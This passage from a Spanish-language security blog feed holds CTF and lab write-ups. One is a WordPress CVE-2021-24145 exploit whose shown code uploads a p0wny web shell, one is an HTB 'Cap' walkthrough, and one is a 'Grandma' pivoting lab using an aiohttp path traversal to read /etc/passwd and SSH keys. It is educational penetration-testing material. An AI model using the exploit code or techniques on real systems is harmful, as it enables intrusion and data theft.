}\n\n            function featureDownload(name, file) {\n                var element = document.createElement(&apos;a&apos;);\n                element.setAttribute(&apos;href&apos;, &apos;data:application/octet-stream;base64,&apos; + file);\n                element.setAttribute(&apos;download&apos;, name);\n                element.style.display = &apos;none&apos;;\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout(&apos;Done.&apos;);\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement(&apos;input&apos;);\n                element.setAttribute(&apos;type&apos;, &apos;file&apos;);\n                element.style.display = &apos;none&apos;;\n                document.body.appendChild(element);\n                element.addEventListener(&apos;change&apos;, function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest(&apos;?feature=upload&apos;, {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\&quot;\\n\&quot;));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout(&apos;An unknown client-side error occurred.&apos;);\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \&quot;~\&quot;;\n                var shortCwd = cwd;\n                if (cwd.split(\&quot;/\&quot;).length &amp;gt; 3) {\n                    var splittedCwd = cwd.split(\&quot;/\&quot;);\n                    shortCwd = \&quot;\xe2\x80\xa6/\&quot; + splittedCwd[splittedCwd.length-2] + \&quot;/\&quot; + splittedCwd[splittedCwd.length-1];\n                }\n                return \&quot;p0wny@shell:&amp;lt;span title=\\\&quot;\&quot; + cwd + \&quot;\\\&quot;&amp;gt;\&quot; + shortCwd + \&quot;&amp;lt;/span&amp;gt;#\&quot;;\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\&quot;?feature=pwd\&quot;, {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&amp;amp;/g, \&quot;&amp;amp;amp;\&quot;)\n                    .replace(/&amp;lt;/g, \&quot;&amp;amp;lt;\&quot;)\n                    .replace(/&amp;gt;/g, \&quot;&amp;amp;gt;\&quot;);\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\&quot;shell-prompt\&quot;);\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \&quot;Enter\&quot;:\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \&quot;\&quot;;\n                        break;\n                    case \&quot;ArrowUp\&quot;:\n                        if (historyPosition &amp;gt; 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \&quot;ArrowDown\&quot;:\n                        if (historyPosition &amp;gt;= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \&quot;\&quot;;\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case &apos;Tab&apos;:\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \&quot;=\&quot; + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\&quot;&amp;amp;\&quot;);\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\&quot;POST\&quot;, url, true);\n                xhr.setRequestHeader(\&quot;Content-Type\&quot;, \&quot;application/x-www-form-urlencoded\&quot;);\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 &amp;amp;&amp;amp; xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\&quot;Error while parsing response: \&quot; + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \&quot;SELECT\&quot;) {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\&quot;shell-cmd\&quot;);\n                eShellContent = document.getElementById(\&quot;shell-content\&quot;);\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        &amp;lt;/script&amp;gt;\n    &amp;lt;/head&amp;gt;\n\n    &amp;lt;body&amp;gt;\n        &amp;lt;div id=\&quot;shell\&quot;&amp;gt;\n            &amp;lt;pre id=\&quot;shell-content\&quot;&amp;gt;\n                &amp;lt;div id=\&quot;shell-logo\&quot;&amp;gt;\n        ___                         ____      _          _ _        _  _   &amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ &amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;\n| &apos;_ \\| | | \\ \\ /\\ / / &apos;_ \\| | | |/ / _` / __| &apos;_ \\ / _ \\ | (_)/\\/_  ..  _|&amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|&amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  &amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;\n|_|                         |___/  \\____/                                  &amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;\n                &amp;lt;/div&amp;gt;\n            &amp;lt;/pre&amp;gt;\n            &amp;lt;div id=\&quot;shell-input\&quot;&amp;gt;\n                &amp;lt;label for=\&quot;shell-cmd\&quot; id=\&quot;shell-prompt\&quot; class=\&quot;shell-prompt\&quot;&amp;gt;???&amp;lt;/label&amp;gt;\n                &amp;lt;div&amp;gt;\n                    &amp;lt;input id=\&quot;shell-cmd\&quot; name=\&quot;cmd\&quot; onkeydown=\&quot;_onShellCmdKeyDown(event)\&quot;/&amp;gt;\n                &amp;lt;/div&amp;gt;\n            &amp;lt;/div&amp;gt;\n        &amp;lt;/div&amp;gt;\n    &amp;lt;/body&amp;gt;\n\n&amp;lt;/html&amp;gt;\n\r\n-----------------------------29650037893637916779865254589\r\nContent-Disposition: form-data; name=\&quot;mec-ix-action\&quot;\r\n\r\nimport-start-bookings\r\n-----------------------------29650037893637916779865254589--\r\n&quot;
+
+# Exploit
+session.post(exploit_url, headers=header, data=body)
+print(&apos;&apos;)
+print(&apos;[+] Shell Uploaded to: &apos; + &apos;http://&apos; + target_ip + &apos;:&apos; + target_port + wp_path + &apos;/wp-content/uploads/shell.php&apos;)
+print(&apos;&apos;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Repository:&lt;/p&gt;
+&lt;p&gt;::github{repo=&quot;dnr6419/CVE-2021-24145&quot;}&lt;/p&gt;
+&lt;p&gt;We will &lt;strong&gt;use&lt;/strong&gt; this &lt;strong&gt;exploit&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We will see that we created a file called &lt;strong&gt;shell.php&lt;/strong&gt; in &lt;em&gt;&lt;strong&gt;/wp-content/uploads/&lt;/strong&gt;&lt;/em&gt; if we enter the file we will see that we have a &lt;a href=&quot;https://github.com/flozz/p0wny-shell&quot;&gt;p0wny@shell&lt;/a&gt; with the ability to &lt;strong&gt;execute commands&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h1&gt;Lababoratory CVE-2021-24145&lt;/h1&gt;
+&lt;p&gt;I have created a machine that is currently uploaded to the &lt;a href=&quot;https://dockerlabs.es&quot;&gt;Dockerlabs&lt;/a&gt; platform where you can touch this vulnerability&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+</content:encoded></item><item><title>Cap</title><link>https://pylonet.pages.dev/posts/cap/</link><guid isPermaLink="true">https://pylonet.pages.dev/posts/cap/</guid><description>En la maquina Cap emplearemos Wireshark para encontrar unas crendenciales de un usuario y con el acceder al SSH donde podremos hacer la escalada de privilegios que son python3.8 capabilities.</description><pubDate>Sun, 18 Aug 2024 00:00:00 GMT</pubDate><content:encoded>&lt;hr /&gt;
+&lt;h2&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Comenzaremos con un escaneo nmap:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Nmap 7.94SVN scan initiated Sun Aug 18 00:54:24 2024 as: nmap -p- --open -sCVS -vvv -n -Pn -oN target 10.10.10.245
+Nmap scan report for 10.10.10.245
+Host is up, received user-set (0.11s latency).
+Scanned at 2024-08-18 00:54:24 CEST for 176s
+Not shown: 63221 closed tcp ports (reset), 2311 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkya
+ynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZ
+bB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPP
+mrKMa9NPh1sjHSdS8IwiH12V0=
+|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI=
+|   256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH
+80/tcp open  http    syn-ack ttl 63 gunicorn
+| http-methods:
+|_  Supported Methods: HEAD GET OPTIONS
+|_http-title: Security Dashboard
+|_http-server-header: gunicorn
+| fingerprint-strings:
+|   FourOhFourRequest:
+|     HTTP/1.0 404 NOT FOUND
+|     Server: gunicorn
+|     Date: Sat, 17 Aug 2024 22:55:27 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 232
+|     &amp;lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&amp;gt;
+|     &amp;lt;title&amp;gt;404 Not Found&amp;lt;/title&amp;gt;
+|     &amp;lt;h1&amp;gt;Not Found&amp;lt;/h1&amp;gt;
+|     &amp;lt;p&amp;gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&amp;lt;/p&amp;gt;
+|   GetRequest:
+|     HTTP/1.0 200 OK
+|     Server: gunicorn
+|     Date: Sat, 17 Aug 2024 22:55:21 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 19386
+|     &amp;lt;!DOCTYPE html&amp;gt;
+|     &amp;lt;html class=&quot;no-js&quot; lang=&quot;en&quot;&amp;gt;
+|     &amp;lt;head&amp;gt;
+|     &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;
+|     &amp;lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&amp;gt;
+|     &amp;lt;title&amp;gt;Security Dashboard&amp;lt;/title&amp;gt;
+|     &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&amp;gt;
+|     &amp;lt;link rel=&quot;shortcut icon&quot; type=&quot;image/png&quot; href=&quot;/static/images/icon/favicon.ico&quot;&amp;gt;
+|     &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/bootstrap.min.css&quot;&amp;gt;
+|     &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/font-awesome.min.css&quot;&amp;gt;
+|     &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/themify-icons.css&quot;&amp;gt;
+|     &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/metisMenu.css&quot;&amp;gt;
+|     &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/owl.carousel.min.css&quot;&amp;gt;
+|     &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/slicknav.min.css&quot;&amp;gt;
+|     &amp;lt;!-- amchar
+|   HTTPOptions:
+|     HTTP/1.0 200 OK
+|     Server: gunicorn
+|     Date: Sat, 17 Aug 2024 22:55:22 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Allow: HEAD, GET, OPTIONS
+|     Content-Length: 0
+|   RTSPRequest:
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|     Content-Type: text/html
+|     Content-Length: 196
+|     &amp;lt;html&amp;gt;
+|     &amp;lt;head&amp;gt;
+|     &amp;lt;title&amp;gt;Bad Request&amp;lt;/title&amp;gt;
+|     &amp;lt;/head&amp;gt;
+|     &amp;lt;body&amp;gt;
+|     &amp;lt;h1&amp;gt;&amp;lt;p&amp;gt;Bad Request&amp;lt;/p&amp;gt;&amp;lt;/h1&amp;gt;
+|     Invalid HTTP Version &amp;amp;#x27;Invalid HTTP Version: &amp;amp;#x27;RTSP/1.0&amp;amp;#x27;&amp;amp;#x27;
+|     &amp;lt;/body&amp;gt;
+|_    &amp;lt;/html&amp;gt;
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port80-TCP:V=7.94SVN%I=7%D=8/18%Time=66C12A4C%P=x86_64-pc-linux-gnu%r(G
+SF:etRequest,2F4C,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\
+SF:x20Sat,\x2017\x20Aug\x202024\x2022:55:21\x20GMT\r\nConnection:\x20close
+SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
+SF:19386\r\n\r\n&amp;lt;!DOCTYPE\x20html&amp;gt;\n&amp;lt;html\x20class=\&quot;no-js\&quot;\x20lang=\&quot;en\
+SF:&quot;&amp;gt;\n\n&amp;lt;head&amp;gt;\n\x20\x20\x20\x20&amp;lt;meta\x20charset=\&quot;utf-8\&quot;&amp;gt;\n\x20\x20\x20
+SF:\x20&amp;lt;meta\x20http-equiv=\&quot;x-ua-compatible\&quot;\x20content=\&quot;ie=edge\&quot;&amp;gt;\n\x
+SF:20\x20\x20\x20&amp;lt;title&amp;gt;Security\x20Dashboard&amp;lt;/title&amp;gt;\n\x20\x20\x20\x20&amp;lt;me
+SF:ta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-sca
+SF:le=1\&quot;&amp;gt;\n\x20\x20\x20\x20&amp;lt;link\x20rel=\&quot;shortcut\x20icon\&quot;\x20type=\&quot;im
+SF:age/png\&quot;\x20href=\&quot;/static/images/icon/favicon\.ico\&quot;&amp;gt;\n\x20\x20\x20\x
+SF:20&amp;lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/bootstrap\.min\.css
+SF:\&quot;&amp;gt;\n\x20\x20\x20\x20&amp;lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/
+SF:font-awesome\.min\.css\&quot;&amp;gt;\n\x20\x20\x20\x20&amp;lt;link\x20rel=\&quot;stylesheet\&quot;\
+SF:x20href=\&quot;/static/css/themify-icons\.css\&quot;&amp;gt;\n\x20\x20\x20\x20&amp;lt;link\x20r
+SF:el=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/metisMenu\.css\&quot;&amp;gt;\n\x20\x20\x20
+SF:\x20&amp;lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/owl\.carousel\.mi
+SF:n\.css\&quot;&amp;gt;\n\x20\x20\x20\x20&amp;lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/stati
+SF:c/css/slicknav\.min\.css\&quot;&amp;gt;\n\x20\x20\x20\x20&amp;lt;!--\x20amchar&quot;)%r(HTTPOpt
+SF:ions,B3,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Sat,
+SF:\x2017\x20Aug\x202024\x2022:55:22\x20GMT\r\nConnection:\x20close\r\nCon
+SF:tent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20HEAD,\x20GET,\x2
+SF:0OPTIONS\r\nContent-Length:\x200\r\n\r\n&quot;)%r(RTSPRequest,121,&quot;HTTP/1\.1
+SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20t
+SF:ext/html\r\nContent-Length:\x20196\r\n\r\n&amp;lt;html&amp;gt;\n\x20\x20&amp;lt;head&amp;gt;\n\x20\
+SF:x20\x20\x20&amp;lt;title&amp;gt;Bad\x20Request&amp;lt;/title&amp;gt;\n\x20\x20&amp;lt;/head&amp;gt;\n\x20\x20&amp;lt;bod
+SF:y&amp;gt;\n\x20\x20\x20\x20&amp;lt;h1&amp;gt;&amp;lt;p&amp;gt;Bad\x20Request&amp;lt;/p&amp;gt;&amp;lt;/h1&amp;gt;\n\x20\x20\x20\x20Inv
+SF:alid\x20HTTP\x20Version\x20&amp;amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;amp;#x27;R
+SF:TSP/1\.0&amp;amp;#x27;&amp;amp;#x27;\n\x20\x20&amp;lt;/body&amp;gt;\n&amp;lt;/html&amp;gt;\n&quot;)%r(FourOhFourRequest,
+SF:189,&quot;HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x
+SF:20Sat,\x2017\x20Aug\x202024\x2022:55:27\x20GMT\r\nConnection:\x20close\
+SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x202
+SF:32\r\n\r\n&amp;lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//W3C//DTD\x20HTML\x203\.2\
+SF:x20Final//EN\&quot;&amp;gt;\n&amp;lt;title&amp;gt;404\x20Not\x20Found&amp;lt;/title&amp;gt;\n&amp;lt;h1&amp;gt;Not\x20Found&amp;lt;/
+SF:h1&amp;gt;\n&amp;lt;p&amp;gt;The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20
+SF:server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x2
+SF:0check\x20your\x20spelling\x20and\x20try\x20again\.&amp;lt;/p&amp;gt;\n&quot;);
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Aug 18 00:57:20 2024 -- 1 IP address (1 host up) scanned in 175.28 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;Intrusión&lt;/h2&gt;
+&lt;p&gt;Vamos a ver el puerto 80:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Podremos ver que estamos como el usuario &lt;strong&gt;Nathan&lt;/strong&gt;, si investigamos un poco por la web podremos encontrarnos lo siguiente:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Podremos ver que es como  una captura de la red, si vemos en la izquierda en el panel podremos ver &lt;code&gt;Security Snapshot (5 Second PCAP + Analysis)&lt;/code&gt; si entramos podremos ver lo siguiente:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Podremos ver que nos a llevado a &lt;code&gt;/data/6&lt;/code&gt; y podemos descargarnos un archivo &lt;code&gt;.pcap&lt;/code&gt; pero si nos lo descargamos y lo abrimos no habra nada, intentaremos ver mas &lt;strong&gt;data&lt;/strong&gt; de la siguiente manera:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Podremos ver que ahora si habra data, asi que nos bajaremos el .pcap:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Ahora lo abriremos con &lt;strong&gt;WireShark&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Si bajamos un poco podremos ver data por el puerto 21 que es el FTP, y si vemos bien se efectua un login donde podemos encontrar la contraseña:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Probaremos a iniciar por FTP a ver si son validas:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Bien son validas, ahora probaremos por SSH a ver si tambien nos funciona:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;Escalada de Privilegios&lt;/h2&gt;
+&lt;p&gt;Usaremos &lt;a href=&quot;https://github.com/peass-ng/PEASS-ng/releases/tag/20240818-ea81ae32&quot;&gt;Linpeas&lt;/a&gt; y podremos ver lo siguiente:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Podremos ir a &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt; y buscaremos &lt;strong&gt;python capabilities&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+</content:encoded></item><item><title>Grandma</title><link>https://pylonet.pages.dev/posts/grandma/</link><guid isPermaLink="true">https://pylonet.pages.dev/posts/grandma/</guid><description>En la maquina Grandma, haremos pivoting para acceder a la ultima maquina donde lograremos ser root. Simulara un entorno hospitalario para que la disfrutes mas la maquina y tenga un toque realista</description><pubDate>Tue, 13 Aug 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Introducción&lt;/h2&gt;
+&lt;h3&gt;Contexto&lt;/h3&gt;
+&lt;p&gt;En esta máquina haremos un total de 3 saltos para acabar siendo root. El contexto que intente dar a esta máquina con pivoting es que la Grandma1 el contexto es que es la primera máquina almacena el servidor web público. En la Grandma2 ya nos adentramos a los servicios del hospital privado y accedemos a una web donde podemos subir reportes de pacientes. Ya en la Grandma3 nos habremos introducido a los servidores internos donde almacenan cookies y otros aplicativos que simularan el funcionamiento de las apps del hospital y para finalizar la última máquina Grandma4 nos encontraremos con una API.&lt;/p&gt;
+&lt;h3&gt;Gráfico Pivoting&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;img/pivoting1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;Gráfico Reverse Shells&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;img/pivoting2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;Enumeración Grandma 1&lt;/h2&gt;
+&lt;p&gt;Empezaremos con un escaneo nmap:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Podremos ver que hay &lt;strong&gt;3 puertos&lt;/strong&gt;, ahora vamos a hacerle un &lt;strong&gt;segundo escaneo&lt;/strong&gt; para ver que corren en ellos:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Podremos ver que en el &lt;strong&gt;puerto 80&lt;/strong&gt; nos hace un &lt;em&gt;redirect&lt;/em&gt; a &lt;strong&gt;http://grandma.dl&lt;/strong&gt; asi que lo añadiremos a nuestro &lt;strong&gt;/etc/hosts&lt;/strong&gt;, ya habiendo añadido podremos acceder a la web:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Podremos ver que el contexto de está máquina es de un &lt;strong&gt;hospital&lt;/strong&gt;, si hacemos &lt;strong&gt;fuzzing&lt;/strong&gt; &lt;strong&gt;no encontraremos&lt;/strong&gt; nada interesante así que vayamos al siguiente puerto &lt;strong&gt;(5000)&lt;/strong&gt;, si accedemos a él podremos &lt;strong&gt;ver&lt;/strong&gt; un &lt;strong&gt;calendario&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;Intrusión Grandma 1&lt;/h2&gt;
+&lt;p&gt;En el &lt;strong&gt;puerto 5000&lt;/strong&gt; podremos ver que lo esta corriendo con &lt;strong&gt;Python/3.12&lt;/strong&gt;
+&lt;strong&gt;aiohttp/3.9.1&lt;/strong&gt;, que si buscamos podremos ver el siguiente CVE:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/ox1111/CVE-2024-23334&quot;&gt;https://github.com/ox1111/CVE-2024-23334&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Ahora explotaremos el &lt;strong&gt;LFI&lt;/strong&gt; que es vulnerable, interceptamos la petición de recarga de la página en el &lt;em&gt;puerto 5000&lt;/em&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Ahora explotaremos el &lt;em&gt;LFI&lt;/em&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Logramos leer el &lt;em&gt;/etc/passwd&lt;/em&gt;, si vemos más el archivo podremos ver que hay un usuario llamado &lt;strong&gt;drzunder&lt;/strong&gt; asi que viendo que el &lt;strong&gt;puerto&lt;/strong&gt; &lt;strong&gt;22&lt;/strong&gt; está abierto intentaremos pillar el &lt;strong&gt;id_rsa&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Ahora nos copiaremos el &lt;em&gt;id_rsa&lt;/em&gt; y iniciaremos por el ssh con el:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;En el directorio &lt;strong&gt;Desktop&lt;/strong&gt; podremos ver la &lt;strong&gt;flag&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;No podremos escalar privilegios en esta máquina así que nos pasaremos a la segunda maquina:&lt;/p&gt;
